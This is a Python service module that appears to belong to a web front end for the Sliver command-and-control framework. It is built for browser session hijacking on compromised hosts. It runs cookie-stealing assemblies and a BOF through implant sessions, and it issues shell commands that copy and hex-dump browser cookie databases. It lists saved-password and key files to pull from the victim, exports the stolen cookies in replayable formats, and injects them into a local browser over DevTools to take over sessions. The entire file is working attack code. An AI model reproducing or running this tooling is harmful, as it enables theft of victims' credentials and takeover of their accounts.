"""
Browser Operations Service

Orchestrates SliverManager primitives for browser session hijacking workflows:
- Cookie extraction via execute-assembly (SharpChromium, SharpDPAPI, etc.)
- Cookie parsing from tool output
- Cookie export in multiple formats (Netscape, JSON, EditThisCookie, Header)
- Browser detection on target
- Profile path resolution
"""

import io
import json
import logging
import re
import zipfile
from datetime import datetime
from pathlib import Path
from typing import List, Optional

import httpx

from app.services.sliver_client import SliverManager

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════════════════════
# Browser Profile Path Maps
# ═══════════════════════════════════════════════════════════════════════════

WINDOWS_BROWSER_PATHS = {
    "chrome": {
        "exe": [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ],
        "profile_base": r"%LOCALAPPDATA%\Google\Chrome\User Data",
        "cookie_file": "Cookies",
        "local_state": "Local State",
    },
    "edge": {
        "exe": [
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
        "profile_base": r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
        "cookie_file": "Cookies",
        "local_state": "Local State",
    },
    "firefox": {
        "exe": [
            r"C:\Program Files\Mozilla Firefox\firefox.exe",
            r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
        ],
        "profile_base": r"%APPDATA%\Mozilla\Firefox\Profiles",
        "cookie_file": "cookies.sqlite",
    },
}

LINUX_BROWSER_PATHS = {
    "chrome": {
        "exe": ["/usr/bin/google-chrome", "/usr/bin/google-chrome-stable"],
        "profile_base": "~/.config/google-chrome",
        "cookie_file": "Cookies",
        "local_state": "Local State",
    },
    "firefox": {
        "exe": ["/usr/bin/firefox"],
        "profile_base": "~/.mozilla/firefox",
        "cookie_file": "cookies.sqlite",
    },
}

PROFILE_DATA_DIR = Path("/app/data/profiles")

# Assembly name mapping for extraction methods
ASSEMBLY_MAP = {
    "sharp_chromium": "SharpChromium.exe",
    "sharp_dpapi": "SharpDPAPI.exe",
    "cookie_monster": None,  # BOF-based, uses different execution
}


class BrowserOpsService:
    """Service for browser session hijacking operations"""

    def __init__(self, sliver: Optional[SliverManager]):
        self.sliver = sliver

    # ═══════════════════════════════════════════════════════════════════
    # Cookie Extraction
    # ═══════════════════════════════════════════════════════════════════

    async def extract_cookies(
        self,
        session_id: str,
        browser: str = "chrome",
        method: str = "sharp_chromium",
        target_domain: Optional[str] = None,
        assembly_path: Optional[str] = None,
        timeout: int = 300,
    ) -> dict:
        """
        Extract cookies from target browser using specified method.
        Returns parsed cookies and raw output.
        """
        raw_output = ""
        cookies = []

        if method == "sharp_chromium":
            raw_output = await self._run_sharp_chromium(
                session_id, browser, target_domain, assembly_path, timeout
            )
            cookies = self._parse_sharp_chromium_output(raw_output)

        elif method == "sharp_dpapi":
            raw_output = await self._run_sharp_dpapi(
                session_id, browser, target_domain, assembly_path, timeout
            )
            cookies = self._parse_sharp_dpapi_output(raw_output)

        elif method == "cookie_monster":
            raw_output = await self._run_cookie_monster(
                session_id, browser, target_domain, timeout
            )
            cookies = self._parse_cookie_monster_output(raw_output)

        elif method == "manual_shell":
            raw_output = await self._run_manual_extraction(
                session_id, browser, target_domain, timeout
            )
            cookies = self._parse_manual_output(raw_output, browser)

        # Filter by domain if specified
        if target_domain and cookies:
            cookies = [
                c for c in cookies
                if target_domain.lower() in c.get("domain", "").lower()
            ]

        return {
            "cookies": cookies,
            "raw_output": raw_output,
            "count": len(cookies),
        }

    async def _run_sharp_chromium(
        self,
        session_id: str,
        browser: str,
        target_domain: Optional[str],
        assembly_path: Optional[str],
        timeout: int,
    ) -> str:
        """Run SharpChromium to extract cookies"""
        path = assembly_path or "SharpChromium.exe"
        args = "cookies"
        if target_domain:
            args += f" /domain:{target_domain}"
        if browser == "edge":
            args += " /edge"

        result = await self.sliver.session_execute_assembly(
            session_id, path, args, timeout
        )
        return result.get("output", "") + result.get("error", "")

    async def _run_sharp_dpapi(
        self,
        session_id: str,
        browser: str,
        target_domain: Optional[str],
        assembly_path: Optional[str],
        timeout: int,
    ) -> str:
        """Run SharpDPAPI to extract cookies via DPAPI"""
        path = assembly_path or "SharpDPAPI.exe"
        args = "cookies"
        if browser == "edge":
            args += " /browser:edge"
        if target_domain:
            args += f" /target:{target_domain}"

        result = await self.sliver.session_execute_assembly(
            session_id, path, args, timeout
        )
        return result.get("output", "") + result.get("error", "")

    async def _run_cookie_monster(
        self,
        session_id: str,
        browser: str,
        target_domain: Optional[str],
        timeout: int,
    ) -> str:
        """Run CookieMonster BOF for in-memory cookie extraction"""
        # CookieMonster is a BOF (Beacon Object File) - run via shell
        # The operator needs to have it installed via armory first
        args = "/chrome"
        if browser == "edge":
            args = "/edge"
        if target_domain:
            args += f" /url:{target_domain}"

        # Use shell to invoke the extension command
        result = await self.sliver.session_shell(
            session_id,
            f"cookie-monster {args}",
            timeout=timeout,
        )
        return result.get("output", "") + result.get("stderr", "")

    async def _run_manual_extraction(
        self,
        session_id: str,
        browser: str,
        target_domain: Optional[str],
        timeout: int,
    ) -> str:
        """Manual extraction: copy cookie file and read it"""
        session = await self.sliver.get_session(session_id)
        os_type = (session or {}).get("os", "").lower()

        if os_type == "windows":
            paths = WINDOWS_BROWSER_PATHS.get(browser, {})
            profile_base = paths.get("profile_base", "")
            cookie_file = paths.get("cookie_file", "Cookies")

            # Copy cookie file to temp and dump it
            cmd = (
                f'copy "{profile_base}\\Default\\{cookie_file}" '
                f'"%TEMP%\\cookies_dump" /Y && '
                f'certutil -encodehex "%TEMP%\\cookies_dump" "%TEMP%\\cookies_hex.txt" 0 && '
                f'type "%TEMP%\\cookies_hex.txt"'
            )
        else:
            paths = LINUX_BROWSER_PATHS.get(browser, {})
            profile_base = paths.get("profile_base", "")
            cookie_file = paths.get("cookie_file", "Cookies")

            cmd = f'cp "{profile_base}/Default/{cookie_file}" /tmp/cookies_dump && xxd /tmp/cookies_dump'

        result = await self.sliver.session_shell(session_id, cmd, timeout=timeout)
        return result.get("output", "") + result.get("stderr", "")

    # ═══════════════════════════════════════════════════════════════════
    # Cookie Parsers
    # ═══════════════════════════════════════════════════════════════════

    def _parse_sharp_chromium_output(self, raw: str) -> List[dict]:
        """
        Parse SharpChromium cookie output.
        Format:
            --- Chrome Cookies ---
            Host: .example.com
            Name: session_id
            Value: abc123
            Path: /
            Expires: 2026-12-31
            Secure: True
            HttpOnly: True
        """
        cookies = []
        current = {}

        for line in raw.split("\n"):
            line = line.strip()

            if not line or line.startswith("---") or line.startswith("["):
                if current and current.get("name"):
                    cookies.append(self._normalize_cookie(current))
                    current = {}
                continue

            if ":" in line:
                key, _, val = line.partition(":")
                key = key.strip().lower()
                val = val.strip()

                if key in ("host", "domain"):
                    current["domain"] = val
                elif key == "name":
                    current["name"] = val
                elif key == "value":
                    current["value"] = val
                elif key == "path":
                    current["path"] = val
                elif key in ("expires", "expiry", "expiration"):
                    current["expires"] = val
                elif key == "secure":
                    current["secure"] = val.lower() in ("true", "1", "yes")
                elif key in ("httponly", "http_only"):
                    current["http_only"] = val.lower() in ("true", "1", "yes")
                elif key in ("samesite", "same_site"):
                    current["same_site"] = val

        # Last cookie
        if current and current.get("name"):
            cookies.append(self._normalize_cookie(current))

        return cookies

    def _parse_sharp_dpapi_output(self, raw: str) -> List[dict]:
        """
        Parse SharpDPAPI cookie output.
        Similar format to SharpChromium but with DPAPI-specific headers.
        """
        # SharpDPAPI output is similar to SharpChromium
        return self._parse_sharp_chromium_output(raw)

    def _parse_cookie_monster_output(self, raw: str) -> List[dict]:
        """
        Parse CookieMonster BOF output.
        Format varies but typically:
            domain=.example.com; name=session; value=abc123; path=/; ...
        """
        cookies = []

        for line in raw.split("\n"):
            line = line.strip()
            if not line or line.startswith("[") or line.startswith("#"):
                continue

            # Try key=value pairs separated by semicolons
            if "=" in line and ";" in line:
                cookie = {}
                parts = line.split(";")
                for part in parts:
                    part = part.strip()
                    if "=" in part:
                        k, _, v = part.partition("=")
                        k = k.strip().lower()
                        v = v.strip()
                        if k in ("domain", "host"):
                            cookie["domain"] = v
                        elif k == "name":
                            cookie["name"] = v
                        elif k == "value":
                            cookie["value"] = v
                        elif k == "path":
                            cookie["path"] = v
                        elif k in ("expires", "expiry"):
                            cookie["expires"] = v
                        elif k == "secure":
                            cookie["secure"] = v.lower() in ("true", "1")
                        elif k in ("httponly", "http_only"):
                            cookie["http_only"] = v.lower() in ("true", "1")

                if cookie.get("name") and cookie.get("domain"):
                    cookies.append(self._normalize_cookie(cookie))

        return cookies

    def _parse_manual_output(self, raw: str, browser: str) -> List[dict]:
        """
        Parse manually extracted cookie data.
        For Firefox (SQLite), tries to parse text output.
        For Chrome, hex-encoded binary is harder - return raw.
        """
        cookies = []

        # Try to parse as tab-separated values (common SQLite .dump format)
        for line in raw.split("\n"):
            line = line.strip()
            parts = line.split("|")
            if len(parts) >= 7:
                try:
                    cookies.append(self._normalize_cookie({
                        "domain": parts[0].strip(),
                        "name": parts[1].strip(),
                        "value": parts[2].strip(),
                        "path": parts[3].strip(),
                        "expires": parts[4].strip(),
                        "secure": parts[5].strip().lower() in ("1", "true"),
                        "http_only": parts[6].strip().lower() in ("1", "true"),
                    }))
                except (IndexError, ValueError):
                    continue

        return cookies

    def _normalize_cookie(self, cookie: dict) -> dict:
        """Normalize a cookie dict with default values"""
        return {
            "domain": cookie.get("domain", ""),
            "name": cookie.get("name", ""),
            "value": cookie.get("value", ""),
            "path": cookie.get("path", "/"),
            "expires": cookie.get("expires"),
            "secure": bool(cookie.get("secure", False)),
            "http_only": bool(cookie.get("http_only", False)),
            "same_site": cookie.get("same_site"),
        }

    # ═══════════════════════════════════════════════════════════════════
    # Cookie Export
    # ═══════════════════════════════════════════════════════════════════

    def export_cookies(
        self,
        cookies: List[dict],
        fmt: str = "netscape",
        domain_filter: Optional[str] = None,
    ) -> dict:
        """Export cookies in the requested format"""
        if domain_filter:
            cookies = [
                c for c in cookies
                if domain_filter.lower() in c.get("domain", "").lower()
            ]

        if fmt == "netscape":
            return self._export_netscape(cookies)
        elif fmt == "json":
            return self._export_json(cookies)
        elif fmt == "editthiscookie":
            return self._export_editthiscookie(cookies)
        elif fmt == "header":
            return self._export_header(cookies)
        else:
            return self._export_netscape(cookies)

    def _export_netscape(self, cookies: List[dict]) -> dict:
        """Export in Netscape/Mozilla cookie.txt format"""
        lines = ["# Netscape HTTP Cookie File", "# Extracted by SliverUI Browser Ops", ""]

        for c in cookies:
            domain = c.get("domain", "")
            domain_flag = "TRUE" if domain.startswith(".") else "FALSE"
            path = c.get("path", "/")
            secure = "TRUE" if c.get("secure") else "FALSE"
            expires = c.get("expires", "0") or "0"
            # Convert datetime string to epoch if needed
            try:
                if not expires.isdigit():
                    dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    expires = str(int(dt.timestamp()))
            except (ValueError, AttributeError):
                expires = "0"
            name = c.get("name", "")
            value = c.get("value", "")

            lines.append(f"{domain}\t{domain_flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}")

        content = "\n".join(lines) + "\n"
        return {
            "content": content,
            "filename": "cookies.txt",
            "content_type": "text/plain",
            "format": "netscape",
            "count": len(cookies),
        }

    def _export_json(self, cookies: List[dict]) -> dict:
        """Export as JSON array"""
        content = json.dumps(cookies, indent=2)
        return {
            "content": content,
            "filename": "cookies.json",
            "content_type": "application/json",
            "format": "json",
            "count": len(cookies),
        }

    def _export_editthiscookie(self, cookies: List[dict]) -> dict:
        """Export in EditThisCookie Chrome extension format"""
        etc_cookies = []
        for c in cookies:
            etc_cookies.append({
                "domain": c.get("domain", ""),
                "expirationDate": c.get("expires", ""),
                "hostOnly": not c.get("domain", "").startswith("."),
                "httpOnly": c.get("http_only", False),
                "name": c.get("name", ""),
                "path": c.get("path", "/"),
                "sameSite": c.get("same_site", "unspecified"),
                "secure": c.get("secure", False),
                "session": not bool(c.get("expires")),
                "storeId": "0",
                "value": c.get("value", ""),
            })

        content = json.dumps(etc_cookies, indent=2)
        return {
            "content": content,
            "filename": "editthiscookie.json",
            "content_type": "application/json",
            "format": "editthiscookie",
            "count": len(cookies),
        }

    def _export_header(self, cookies: List[dict]) -> dict:
        """Export as HTTP Cookie header string"""
        pairs = [f"{c['name']}={c['value']}" for c in cookies if c.get("name")]
        content = "Cookie: " + "; ".join(pairs)
        return {
            "content": content,
            "filename": "cookie_header.txt",
            "content_type": "text/plain",
            "format": "header",
            "count": len(cookies),
        }

    # ═══════════════════════════════════════════════════════════════════
    # Browser Detection
    # ═══════════════════════════════════════════════════════════════════

    async def detect_browsers(self, session_id: str) -> dict:
        """Detect installed browsers and running instances on target"""
        session = await self.sliver.get_session(session_id)
        if not session:
            return {"browsers": [], "os": "", "hostname": ""}

        os_type = session.get("os", "").lower()
        hostname = session.get("hostname", "")
        browsers = []

        if os_type == "windows":
            browsers = await self._detect_windows_browsers(session_id)
        else:
            browsers = await self._detect_linux_browsers(session_id)

        return {"browsers": browsers, "os": os_type, "hostname": hostname}

    async def _detect_windows_browsers(self, session_id: str) -> List[dict]:
        """Detect browsers on Windows target"""
        browsers = []

        # Check installed browsers and running processes in one command
        cmd = (
            'powershell -Command "'
            "$procs = Get-Process -ErrorAction SilentlyContinue | "
            "Select-Object -Property ProcessName,Id | ConvertTo-Json -Compress; "
            "$chrome = Test-Path 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'; "
            "$edge = Test-Path 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'; "
            "$ff = Test-Path 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'; "
            "@{Processes=$procs;Chrome=$chrome;Edge=$edge;Firefox=$ff} | ConvertTo-Json"
            '"'
        )

        result = await self.sliver.session_shell(session_id, cmd, timeout=30)
        output = result.get("output", "")

        try:
            data = json.loads(output)
            procs_raw = data.get("Processes", [])
            if isinstance(procs_raw, str):
                procs_raw = json.loads(procs_raw)

            proc_names = {}
            if isinstance(procs_raw, list):
                for p in procs_raw:
                    name = p.get("ProcessName", "").lower()
                    if name in proc_names:
                        proc_names[name].append(p.get("Id", 0))
                    else:
                        proc_names[name] = [p.get("Id", 0)]

            if data.get("Chrome"):
                running = "chrome" in proc_names
                browsers.append({
                    "name": "Google Chrome",
                    "browser_type": "chrome",
                    "exe_path": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    "running": running,
                    "pid": proc_names.get("chrome", [None])[0] if running else None,
                    "profiles": ["Default"],
                    "cookie_path": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies",
                })

            if data.get("Edge"):
                running = "msedge" in proc_names
                browsers.append({
                    "name": "Microsoft Edge",
                    "browser_type": "edge",
                    "exe_path": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                    "running": running,
                    "pid": proc_names.get("msedge", [None])[0] if running else None,
                    "profiles": ["Default"],
                    "cookie_path": r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies",
                })

            if data.get("Firefox"):
                running = "firefox" in proc_names
                browsers.append({
                    "name": "Mozilla Firefox",
                    "browser_type": "firefox",
                    "exe_path": r"C:\Program Files\Mozilla Firefox\firefox.exe",
                    "running": running,
                    "pid": proc_names.get("firefox", [None])[0] if running else None,
                    "profiles": ["default-release"],
                    "cookie_path": r"%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite",
                })

        except (json.JSONDecodeError, KeyError, TypeError) as e:
            logger.warning(f"Failed to parse browser detection output: {e}")
            # Fallback: basic detection via process list
            ps_result = await self.sliver.session_shell(
                session_id, "tasklist /FI \"IMAGENAME eq chrome.exe\" /FO CSV", timeout=15
            )
            ps_output = ps_result.get("output", "")
            if "chrome.exe" in ps_output.lower():
                browsers.append({
                    "name": "Google Chrome",
                    "browser_type": "chrome",
                    "exe_path": "",
                    "running": True,
                    "profiles": ["Default"],
                    "cookie_path": "",
                })

        return browsers

    async def _detect_linux_browsers(self, session_id: str) -> List[dict]:
        """Detect browsers on Linux target"""
        browsers = []

        cmd = (
            "echo '---CHROME---' && which google-chrome 2>/dev/null && "
            "echo '---FIREFOX---' && which firefox 2>/dev/null && "
            "echo '---PROCS---' && ps aux | grep -E '(chrome|firefox)' | grep -v grep"
        )

        result = await self.sliver.session_shell(session_id, cmd, timeout=15)
        output = result.get("output", "")

        has_chrome = bool(re.search(r"---CHROME---\s*\n\s*/", output))
        has_firefox = bool(re.search(r"---FIREFOX---\s*\n\s*/", output))
        chrome_running = "chrome" in output.split("---PROCS---")[-1].lower() if "---PROCS---" in output else False
        firefox_running = "firefox" in output.split("---PROCS---")[-1].lower() if "---PROCS---" in output else False

        if has_chrome:
            browsers.append({
                "name": "Google Chrome",
                "browser_type": "chrome",
                "exe_path": "/usr/bin/google-chrome",
                "running": chrome_running,
                "profiles": ["Default"],
                "cookie_path": "~/.config/google-chrome/Default/Cookies",
            })

        if has_firefox:
            browsers.append({
                "name": "Mozilla Firefox",
                "browser_type": "firefox",
                "exe_path": "/usr/bin/firefox",
                "running": firefox_running,
                "profiles": ["default-release"],
                "cookie_path": "~/.mozilla/firefox/*.default-release/cookies.sqlite",
            })

        return browsers

    # ═══════════════════════════════════════════════════════════════════
    # Proxy Config Generation
    # ═══════════════════════════════════════════════════════════════════

    def generate_proxy_configs(self, host: str, port: int) -> dict:
        """Generate browser proxy configuration snippets"""
        proxy_addr = f"{host}:{port}"

        # PAC file content
        proxy_pac = (
            f'function FindProxyForURL(url, host) {{\n'
            f'  return "SOCKS5 {proxy_addr}";\n'
            f'}}'
        )

        # Chrome launch command
        browser_launch_cmd = (
            f'chrome --proxy-server="socks5://{proxy_addr}" '
            f'--user-data-dir=/tmp/proxy-profile '
            f'--no-first-run --no-default-browser-check'
        )

        # FoxyProxy config
        foxyproxy_config = json.dumps({
            "mode": "fixed_servers",
            "fixed_servers": {
                "socks": {
                    "host": host,
                    "port": port,
                    "scheme": "socks5",
                }
            }
        }, indent=2)

        # curl example
        curl_example = f'curl --socks5-hostname {proxy_addr} https://target.com'

        return {
            "proxy_pac": proxy_pac,
            "browser_launch_cmd": browser_launch_cmd,
            "foxyproxy_config": foxyproxy_config,
            "curl_example": curl_example,
        }

    # ═══════════════════════════════════════════════════════════════════
    # CDP Config Generation
    # ═══════════════════════════════════════════════════════════════════

    def generate_cdp_urls(self, local_host: str, local_port: int) -> dict:
        """Generate CDP connection URLs"""
        base = f"{local_host}:{local_port}"
        return {
            "local_url": f"http://{base}",
            "devtools_frontend": f"chrome-devtools://devtools/bundled/inspector.html?ws={base}/devtools/page/",
            "ws_debug_url": f"ws://{base}/devtools/browser/",
            "json_url": f"http://{base}/json",
        }

    # ═══════════════════════════════════════════════════════════════════
    # Profile Download
    # ═══════════════════════════════════════════════════════════════════

    async def get_profile_files(
        self,
        session_id: str,
        browser: str = "chrome",
        profile_name: str = "Default",
    ) -> List[dict]:
        """Get list of important profile files to download"""
        session = await self.sliver.get_session(session_id)
        if not session:
            return []

        os_type = session.get("os", "").lower()

        if os_type == "windows":
            paths = WINDOWS_BROWSER_PATHS.get(browser, {})
            base = paths.get("profile_base", "")
            files = ["Cookies", "Login Data", "Web Data", "Local State", "Bookmarks"]
            if browser == "firefox":
                files = ["cookies.sqlite", "logins.json", "key4.db", "cert9.db"]
        else:
            paths = LINUX_BROWSER_PATHS.get(browser, {})
            base = paths.get("profile_base", "")
            files = ["Cookies", "Login Data", "Web Data", "Local State"]
            if browser == "firefox":
                files = ["cookies.sqlite", "logins.json", "key4.db", "cert9.db"]

        return [{"name": f, "base_path": base, "profile": profile_name} for f in files]

    # ═══════════════════════════════════════════════════════════════════
    # Profile Launch (save locally + ZIP + launch commands)
    # ═══════════════════════════════════════════════════════════════════

    def save_profile_locally(
        self,
        session_id: str,
        browser: str,
        profile_name: str,
        files_data: List[dict],
    ) -> str:
        """
        Save downloaded profile files to local filesystem.
        files_data: [{"name": "Cookies", "data": bytes}, ...]
        Returns the profile directory path.
        """
        profile_dir = PROFILE_DATA_DIR / session_id / browser / profile_name
        profile_dir.mkdir(parents=True, exist_ok=True)

        for f in files_data:
            file_path = profile_dir / f["name"]
            file_path.write_bytes(f["data"])

        return str(profile_dir)

    def create_profile_zip(self, profile_dir: str) -> bytes:
        """Create a ZIP archive of a profile directory"""
        buf = io.BytesIO()
        base = Path(profile_dir)

        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for file_path in base.rglob("*"):
                if file_path.is_file():
                    arcname = file_path.relative_to(base.parent)
                    zf.write(file_path, arcname)

        return buf.getvalue()

    def generate_launch_commands(self, browser: str, profile_dir: str) -> dict:
        """Generate browser launch commands for each OS"""
        commands = {}

        if browser in ("chrome", "edge"):
            exe_linux = "google-chrome" if browser == "chrome" else "microsoft-edge"
            exe_mac = (
                "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
                if browser == "chrome"
                else "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"
            )
            exe_win = (
                r"C:\Program Files\Google\Chrome\Application\chrome.exe"
                if browser == "chrome"
                else r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
            )

            flags = "--no-first-run --no-default-browser-check --disable-sync"
            commands["linux"] = f'{exe_linux} --user-data-dir="{profile_dir}" {flags}'
            commands["macos"] = f'"{exe_mac}" --user-data-dir="{profile_dir}" {flags}'
            commands["windows"] = f'"{exe_win}" --user-data-dir="{profile_dir}" {flags}'

        elif browser == "firefox":
            commands["linux"] = f'firefox --profile "{profile_dir}" --no-remote'
            commands["macos"] = f'/Applications/Firefox.app/Contents/MacOS/firefox --profile "{profile_dir}" --no-remote'
            commands["windows"] = f'"C:\\Program Files\\Mozilla Firefox\\firefox.exe" --profile "{profile_dir}" --no-remote'

        return commands

    # ═══════════════════════════════════════════════════════════════════
    # CDP Cookie Injection
    # ═══════════════════════════════════════════════════════════════════

    async def inject_cookies_cdp(
        self,
        host: str,
        port: int,
        cookies: List[dict],
    ) -> dict:
        """
        Inject cookies into a local browser via Chrome DevTools Protocol.
        Connects via WebSocket to CDP and uses Network.setCookie for each cookie.
        """
        import websockets

        injected = 0
        failed = 0
        errors = []

        # Get the browser WebSocket URL
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                resp = await client.get(f"http://{host}:{port}/json/version")
                resp.raise_for_status()
                version_info = resp.json()
                ws_url = version_info.get("webSocketDebuggerUrl", "")
        except Exception as e:
            return {
                "injected": 0,
                "failed": len(cookies),
                "errors": [f"Failed to connect to CDP at {host}:{port}: {e}"],
            }

        if not ws_url:
            return {
                "injected": 0,
                "failed": len(cookies),
                "errors": ["No webSocketDebuggerUrl in CDP response"],
            }

        try:
            async with websockets.connect(ws_url) as ws:
                msg_id = 1

                # Enable Network domain
                await ws.send(json.dumps({
                    "id": msg_id,
                    "method": "Network.enable",
                }))
                await ws.recv()
                msg_id += 1

                # Set each cookie
                for cookie in cookies:
                    cdp_cookie = {
                        "name": cookie.get("name", ""),
                        "value": cookie.get("value", ""),
                        "domain": cookie.get("domain", ""),
                        "path": cookie.get("path", "/"),
                        "secure": cookie.get("secure", False),
                        "httpOnly": cookie.get("http_only", False),
                    }

                    # Set URL for the cookie (required by CDP)
                    domain = cdp_cookie["domain"].lstrip(".")
                    scheme = "https" if cdp_cookie["secure"] else "http"
                    cdp_cookie["url"] = f"{scheme}://{domain}{cdp_cookie['path']}"

                    if cookie.get("same_site"):
                        ss = cookie["same_site"].capitalize()
                        if ss in ("Strict", "Lax", "None"):
                            cdp_cookie["sameSite"] = ss

                    if cookie.get("expires"):
                        try:
                            if cookie["expires"].isdigit():
                                cdp_cookie["expires"] = int(cookie["expires"])
                            else:
                                dt = datetime.fromisoformat(
                                    cookie["expires"].replace("Z", "+00:00")
                                )
                                cdp_cookie["expires"] = int(dt.timestamp())
                        except (ValueError, AttributeError):
                            pass

                    await ws.send(json.dumps({
                        "id": msg_id,
                        "method": "Network.setCookie",
                        "params": cdp_cookie,
                    }))
                    resp_raw = await ws.recv()
                    resp_data = json.loads(resp_raw)
                    msg_id += 1

                    result = resp_data.get("result", {})
                    if result.get("success", False):
                        injected += 1
                    else:
                        failed += 1
                        errors.append(
                            f"Failed to set {cookie.get('name', '?')} "
                            f"for {cookie.get('domain', '?')}"
                        )

        except Exception as e:
            errors.append(f"WebSocket error: {e}")
            failed += len(cookies) - injected

        return {
            "injected": injected,
            "failed": failed,
            "errors": errors,
        }

    async def list_cdp_targets(self, host: str, port: int) -> List[dict]:
        """List open tabs/targets via CDP /json endpoint"""
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                resp = await client.get(f"http://{host}:{port}/json")
                resp.raise_for_status()
                return resp.json()
        except Exception as e:
            logger.warning(f"Failed to list CDP targets at {host}:{port}: {e}")
            return []
